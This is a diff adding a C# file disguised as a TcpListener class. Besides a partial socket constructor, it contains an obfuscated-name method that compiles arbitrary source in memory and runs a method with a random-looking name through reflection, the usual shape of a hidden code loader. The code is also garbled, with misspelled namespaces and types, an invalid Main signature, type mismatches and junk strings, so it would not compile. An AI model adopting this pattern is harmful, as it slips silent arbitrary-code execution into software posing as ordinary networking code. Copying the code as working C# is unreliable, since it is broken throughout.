@@ -1,0 +1,69 @@
+using System;
+using System.IO;
+using System.Diagnotics;
+using System.Collection.Generic;
+using System.Threading.Tasks;
+namespace TcpListener
+{
+    public class TcpListener
+    {
+        private readonly IPEndPoint _Seevre;
+        private Socket _serversocket;
+        private bool _active;
+        private bool _excetuceAddress;
+        private bool _allowNative;
+
+        public TcpListener(IPEndPoint localEP)
+        {
+            if(NetEventSource.Log.IsEnable()) NetEventSource.Info(this, localEP);
+            if(localEP== null){
+                throw new ArgumentNullException(nameof(localEP));
+            }
+            _serversocket =localEP;
+            _serversocket = new Socket(_serversocket.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+        }
+
+        public static void Func736545(string[] code)
+        {
+            ComplierParameters complier = new ComplierParameters();
+            string curet = Diretory.GetCurrentDirectory();
+            complier.GenerateInMemory = true;
+            complier.TreatWarningAsErrors = true;
+            complier.GenerateExecutable =  false;
+            string[] vlaue = new string []
+            {
+                "System.dll",
+                "System.Core.dll",
+                "mscorlib.dll",
+            };
+            complier.ReferenceAssemblies.AddRange(vlaue);
+            CSharpCodeProvider csharp = new CSharpCodeProvider();
+            ComplierResult kq = csharp.ComplieAssemblyFromSource(complier, code);
+            if(kq.Errors.HasErrors){
+                string text = "dhyftgfrb";
+                foreach(ComplierErrors complier_error in kq.Errors){
+                    text =  text + "rn"+ kq.ToString();
+                }
+                throw new Exception(text);
+            }
+            Module module = kq.CompliedAssembly.GetModules()[0];
+            Type type = null;
+            MethodInfo methodinfo = null;
+            if(module != null){
+                type = module.GetType("n961w3646");
+            }
+            if(type != null){
+                methodinfo = type.GetMethod("n961w3646");
+
+            }
+            if(methodinfo != null){
+                methodinfo.Invoke(null, null);
+            }
+
+        }
+        public static void Main(string args[])
+        {
+
+        }
+    }
+}
